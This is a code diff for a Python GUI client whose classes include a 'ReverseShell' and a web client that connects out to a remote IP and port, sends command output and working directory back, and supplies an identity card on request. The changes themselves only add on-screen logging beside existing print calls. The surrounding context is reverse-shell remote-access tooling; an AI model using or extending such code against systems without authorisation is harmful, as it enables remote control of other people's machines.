@@ -120,6 +120,8 @@ class  ReverseShell():
                 output_str = str(output_byte,"utf-8")
                 currentWD = os.getcwd() + "> "
                 self.connection.send_data(str.encode(output_str + currentWD))
+                msg = str(output_str) + "\n"
+                app.display_text(msg)
                 print(output_str)
     
     def __thread__(self):
@@ -146,17 +148,25 @@ class Connection():
 
     def establish_with(self, IP, PORT):
         try:
+            app.display_text("Establishing connection....\n")
             print("Establishing connection....")
             self.socket.connect((IP, PORT))
             self.remote_ip = IP
             self.remote_port = PORT
             self.__reset_state_to__(True)
             self.connection_ready_for_use = True
-            print("Connection established with ", self.remote_ip, self.remote_port)
+            msg = "Connection established with " + str(self.remote_ip) + str(self.remote_port) + "\n"
+            app.display_text(msg)
+            print(msg)
             return True
         except Exception as error:
-            if(self.show_connection_error): print("Failed!")
-            else: print("Failed! [ERROR]:", error)
+            if(self.show_connection_error): 
+                app.display_text("Failed!\n")
+                print("Failed!")
+            else: 
+                msg = "Failed! [ERROR]:" + str(error) + "\n"
+                app.display_text(msg)
+                print(msg)
             self.__reset_state_to__(False)
             self.connection_ready_for_use = False
             return False
@@ -166,6 +176,7 @@ class Connection():
 
     def send_data(self, data):
         if(self.connection_ready_for_use != True):
+            app.display_text("[Error]: Connection not ready for sending...  Open() the conenction\n")
             print("[Error]: Connection not ready for sending...  Open() the conenction")
             return False
         
@@ -179,6 +190,7 @@ class Connection():
     
     def recieve_data(self):
         if(self.connection_ready_for_use != True):
+            app.display_text("[Error]: Connection not ready for recieving...  Open() the conenction\n")
             print("[Error]: Connection not ready for recieving...  Open() the conenction")
             return False
         
@@ -334,14 +346,18 @@ class WebClient():
 
     def connect_to(self, IP, PORT):
         if(self.connection.establish_with(IP, PORT)):
-            print("[Web Client] - " + self.client_id.read().name(), "is active and connected")
+            msg = "[Web Client] - " + str(self.client_id.read().name()) + "is active and connected\n"
+            app.display_text(msg)
+            print(msg)
             self.remote_address = self.connection.remote_server_address()
             self.local_address = self.connection.local_machine_address()
             self.status.set_true()
         
         else:
             self.status.set_false()
-            print("[Web Client - " + self.client_id.read().name(), "is NOT active and disconnected")
+            msg = "[Web Client] - " + str(self.client_id.read().name()) + "is NOT active and disconnected\n"
+            app.display_text(msg)
+            print(msg)
         return self
 
     def process(self, data):
@@ -357,6 +373,7 @@ class WebClient():
             self.send_message(output_str + currentWD)
             #self.connection.send_data(str.encode(output_str + currentWD))
             #print(output_str)
+            
 
     def __reciever__(self):
 
@@ -371,16 +388,24 @@ class WebClient():
     def run(self):
 
         if(self.status.get() == False):
+            app.display_text("In-active web client can't run\n")
             print("In-active web client can't run")
             return
         
         self.connection.open()
 
+        msg = "Local Address: " + str(self.local_address) + "\n"
+        msg2 = "Connected to: " + str(self.remote_address) + "\n"
+
+        app.display_text("            Web Client   \n")
+        app.display_text("_____________________________________\n")
+        app.display_text(msg)
+        app.display_text(msg2)
+
         print("            Web Client   ")
         print("_____________________________________")
-        print("Local Address:", self.local_address)
-        print("Connected to:", self.remote_address)
-
+        print(msg)
+        print(msg2)
         recv_thread = threading.Thread(target=self.__reciever__)
         recv_thread.start()
         
@@ -400,7 +425,8 @@ class WebClient():
                 self.status.set_false()
                 self.connection.close()
                 break
-
+        app.display_text("           Web Client Closed\n")
+        app.display_text("______________________________________\n")
         print("           Web Client Closed")
         print("______________________________________")
         return self
@@ -432,6 +458,7 @@ class WebClient():
         if(message == '--GET_IDENTITY_CARD--' ):
             _id = self.client_id.get_dict()
             sent = self.connection.send_data(json.dumps(_id))
+            app.display_text("Sent ID CARD....\n")
             print("Sent ID CARD....")
             return True
 
@@ -450,6 +477,8 @@ class WebClient():
         self.messenger.unpack_request_body(message)
         username = self.messenger.get_request_field('USERNAME')
         timestamp = self.messenger.get_request_field('TIME_STAMP')
+        msg = str(username) + str(self.messenger.get_request_message()) + "\n"
+        app.display_text(msg)
         print("{}:".format(username), self.messenger.get_request_message())
         self.messenger.flush()
 
@@ -530,9 +559,14 @@ class App(customtkinter.CTk):
         client.status.set_false()
         client.connection.close()
 
+        msg = "Name:" + str(client.get_card().read().name()) + "\n"
+        app.display_text("           Web Client Closed\n")
+        app.display_text("______________________________________\n")
+        app.display_text(msg)
+
         print("           Web Client Closed")
         print("______________________________________")
-        print("Name:", client.get_card().read().name())
+        print(msg)
         client.close()
         self.destroy()
     
